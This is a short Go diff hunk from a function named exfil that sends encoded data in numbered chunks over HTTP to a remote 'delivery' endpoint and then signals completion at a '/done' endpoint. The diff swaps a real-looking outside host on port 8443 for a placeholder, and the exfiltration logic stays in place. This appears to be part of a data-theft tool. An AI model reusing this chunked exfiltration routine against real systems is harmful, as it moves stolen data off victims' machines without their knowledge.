@@ -85,7 +85,7 @@ func exfil(encoded string) {
 			"parcel": {strconv.Itoa(i)},
 		}
 
-		URL := "http://authenticamerican.co.uk:8443/delivery"
+		URL := "http://website/delivery"
 		fmt.Printf("Sending Chunk %d:\n%s\n", i, chunkedboi[i])
 		fmt.Println(URL)
 
@@ -93,7 +93,7 @@ func exfil(encoded string) {
 
 	}
 
-	http.Get("http://authenticamerican.co.uk:8443/done")
+	http.Get("http://website/done")
 	fmt.Println("All chunks sent, sent to /done")
 
 }
